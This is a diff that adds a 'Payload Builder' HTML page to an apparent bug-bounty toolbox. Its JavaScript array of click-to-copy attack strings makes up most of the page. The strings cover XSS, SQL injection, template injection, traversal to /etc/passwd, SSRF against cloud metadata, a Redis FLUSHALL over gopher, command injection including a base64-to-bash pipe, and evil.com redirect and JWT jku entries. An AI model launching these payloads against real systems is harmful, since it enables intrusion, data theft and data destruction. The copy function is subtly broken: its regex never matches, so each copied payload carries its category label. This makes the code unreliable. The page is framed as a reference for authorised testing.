@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Payload Builder — Security Toolbox</title>
+<meta name="description" content="Generate and browse security test payloads for XSS, SQL injection, SSTI, path traversal, and more. Quick reference for bug bounty testing.">
+<link rel="stylesheet" href="../css/style.css">
+<style>
+.payload-cat { margin-bottom: 1rem; }
+.payload-cat h4 { font-size: .85rem; color: var(--accent2); margin-bottom: .4rem; }
+.payload-item { 
+  font-size: .78rem; padding: .4rem .6rem; margin-bottom: .2rem; 
+  background: var(--bg2); border: 1px solid var(--border); border-radius: 4px;
+  cursor: pointer; font-family: var(--font); word-break: break-all;
+  transition: border-color .2s;
+}
+.payload-item:hover { border-color: var(--accent); }
+.payload-item .tag { 
+  display: inline-block; font-size: .6rem; padding: .1rem .3rem;
+  border-radius: 2px; margin-right: .4rem; background: var(--bg3);
+}
+.tag-xss { color: #ef4444; }
+.tag-sqli { color: #f59e0b; }
+.tag-ssti { color: #0ea5e9; }
+.tag-traversal { color: #22c55e; }
+.tag-other { color: #a78bfa; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Sec<span>Toolbox</span></h1>
+  <span class="subtitle">tools for bug hunters & developers</span>
+  <span class="badge">beta</span>
+</header>
+
+<div class="tool-page">
+  <a href="../index.html" class="back">← Back to tools</a>
+  <h2>Payload Builder</h2>
+  <p class="desc">Quick reference of security test payloads. Click a payload to copy it, then paste into your request. Use responsibly — only on targets you own or have permission to test.</p>
+
+  <label for="pb-filter">Filter payloads</label>
+  <input type="text" id="pb-filter" placeholder="Search payloads (xss, sqli, etc)" oninput="filterPayloads()">
+  <div style="font-size:.75rem;color:var(--text2);margin-top:.3rem">Click any payload to copy to clipboard.</div>
+
+  <h3 style="margin-top:1rem;font-size:.85rem;color:var(--text2)">Payloads</h3>
+  <div id="pb-output"></div>
+</div>
+
+<footer>
+  <p>Built by <a href="https://github.com/ReplikanteK">K</a> &middot; For authorized testing only</p>
+</footer>
+
+<script>
+const PAYLOADS = [
+  // XSS
+  { text: '<script>alert(1)</script>', cat: 'XSS', tags: ['xss', 'basic'] },
+  { text: '"><script>alert(1)</script>', cat: 'XSS', tags: ['xss', 'attr-breakout'] },
+  { text: '<img src=x onerror=alert(1)>', cat: 'XSS', tags: ['xss', 'img'] },
+  { text: 'javascript:alert(1)//', cat: 'XSS', tags: ['xss', 'href'] },
+  { text: '\'"><img src=x onerror=alert(1)>', cat: 'XSS', tags: ['xss', 'universal'] },
+  { text: '{{constructor.constructor(\'alert(1)\')()}}', cat: 'SSTI', tags: ['ssti', 'js'] },
+  { text: '{{7*7}}', cat: 'SSTI', tags: ['ssti', 'basic'] },
+
+  // SQLi
+  { text: '\' OR 1=1 --', cat: 'SQLi', tags: ['sqli', 'auth-bypass'] },
+  { text: '\' OR \'1\'=\'1', cat: 'SQLi', tags: ['sqli', 'auth-bypass'] },
+  { text: '\' UNION SELECT NULL--', cat: 'SQLi', tags: ['sqli', 'union'] },
+  { text: '\' UNION SELECT 1,2,3--', cat: 'SQLi', tags: ['sqli', 'union'] },
+  { text: '\' AND SLEEP(5)--', cat: 'SQLi', tags: ['sqli', 'time-based'] },
+  { text: '\' WAITFOR DELAY \'0:0:5\'--', cat: 'SQLi', tags: ['sqli', 'mssql', 'time-based'] },
+  { text: 'admin\' --', cat: 'SQLi', tags: ['sqli', 'auth-bypass'] },
+
+  // Path Traversal
+  { text: '../../../etc/passwd', cat: 'Traversal', tags: ['traversal', 'unix'] },
+  { text: '..\\..\\..\\windows\\win.ini', cat: 'Traversal', tags: ['traversal', 'windows'] },
+  { text: '%2e%2e%2f%2e%2e%2fetc/passwd', cat: 'Traversal', tags: ['traversal', 'url-encoded'] },
+  { text: '....//....//....//etc/passwd', cat: 'Traversal', tags: ['traversal', 'bypass'] },
+  { text: '..;/..;/..;/etc/passwd', cat: 'Traversal', tags: ['traversal', 'tomcat'] },
+  { text: '/etc/passwd', cat: 'Traversal', tags: ['traversal', 'absolute'] },
+
+  // SSTI
+  { text: '{{7*7}}', cat: 'SSTI', tags: ['ssti', 'basic'] },
+  { text: '{{config}}', cat: 'SSTI', tags: ['ssti', 'flask'] },
+  { text: '${7*7}', cat: 'SSTI', tags: ['ssti', 'jsp'] },
+  { text: '#{7*7}', cat: 'SSTI', tags: ['ssti', 'ruby'] },
+  { text: '<%= 7*7 %>', cat: 'SSTI', tags: ['ssti', 'erb'] },
+
+  // SSRF
+  { text: 'http://127.0.0.1:80', cat: 'SSRF', tags: ['ssrf', 'localhost'] },
+  { text: 'http://169.254.169.254/latest/meta-data/', cat: 'SSRF', tags: ['ssrf', 'aws', 'metadata'] },
+  { text: 'file:///etc/passwd', cat: 'SSRF', tags: ['ssrf', 'file-read'] },
+  { text: 'gopher://localhost:6379/_*1%0d%0a$8%0d%0aFLUSHALL', cat: 'SSRF', tags: ['ssrf', 'gopher', 'redis'] },
+  { text: 'http://0.0.0.0:22', cat: 'SSRF', tags: ['ssrf', 'localhost'] },
+
+  // Command Injection
+  { text: '; whoami', cat: 'CMD', tags: ['cmd', 'unix'] },
+  { text: '| whoami', cat: 'CMD', tags: ['cmd', 'unix'] },
+  { text: '$(whoami)', cat: 'CMD', tags: ['cmd', 'unix'] },
+  { text: '`whoami`', cat: 'CMD', tags: ['cmd', 'unix'] },
+  { text: '& whoami &', cat: 'CMD', tags: ['cmd', 'unix'] },
+  { text: '| echo Y3VybCAtRSA... | base64 -d | bash', cat: 'CMD', tags: ['cmd', 'encoded'] },
+
+  // Open Redirect
+  { text: '//evil.com', cat: 'Redirect', tags: ['redirect', 'protocol-relative'] },
+  { text: 'https://evil.com', cat: 'Redirect', tags: ['redirect', 'absolute'] },
+  { text: '/\\evil.com', cat: 'Redirect', tags: ['redirect', 'squatting'] },
+  { text: '@evil.com', cat: 'Redirect', tags: ['redirect', 'credentials'] },
+
+  // JWK
+  { text: '"alg":"none"', cat: 'JWT', tags: ['jwt', 'none-alg'] },
+  { text: 'kid: "../../../etc/passwd"', cat: 'JWT', tags: ['jwt', 'path-traversal', 'kid'] },
+  { text: 'jku: "https://evil.com/jwks.json"', cat: 'JWT', tags: ['jwt', 'jku', 'ssrf'] },
+];
+
+function renderPayloads(filter = '') {
+  const container = document.getElementById('pb-output');
+
+  const filtered = filter
+    ? PAYLOADS.filter(p =>
+        p.text.toLowerCase().includes(filter.toLowerCase()) ||
+        p.cat.toLowerCase().includes(filter.toLowerCase()) ||
+        p.tags.some(t => t.toLowerCase().includes(filter.toLowerCase()))
+      )
+    : PAYLOADS;
+
+  const grouped = {};
+  filtered.forEach(p => {
+    if (!grouped[p.cat]) grouped[p.cat] = [];
+    grouped[p.cat].push(p);
+  });
+
+  let html = '';
+  Object.entries(grouped).forEach(([cat, items]) => {
+    html += `<div class="payload-cat"><h4>${cat} (${items.length})</h4>`;
+    items.forEach(p => {
+      const tagClass = p.cat === 'XSS' ? 'tag-xss' :
+                       p.cat === 'SQLi' ? 'tag-sqli' :
+                       p.cat === 'Traversal' ? 'tag-traversal' :
+                       p.cat === 'SSTI' ? 'tag-ssti' : 'tag-other';
+      html += `<div class="payload-item" onclick="copyPayload(this)" title="Click to copy">`;
+      html += `<span class="tag ${tagClass}">${p.cat}</span> ${escapeHtml(p.text)}`;
+      html += `</div>`;
+    });
+    html += '</div>';
+  });
+
+  if (!html) {
+    container.innerHTML = '<div class="output">No payloads match your filter.</div>';
+  } else {
+    container.innerHTML = html;
+  }
+}
+
+function copyPayload(el) {
+  const text = el.textContent.replace(/^.*?\]/, '').trim();
+  navigator.clipboard.writeText(text).then(() => {
+    el.style.borderColor = '#22c55e';
+    setTimeout(() => el.style.borderColor = '', 500);
+  }).catch(() => {
+    // Fallback
+    const ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function filterPayloads() {
+  const filter = document.getElementById('pb-filter').value;
+  renderPayloads(filter);
+}
+
+document.addEventListener('DOMContentLoaded', () => renderPayloads());
+</script>
+</body>
+</html>
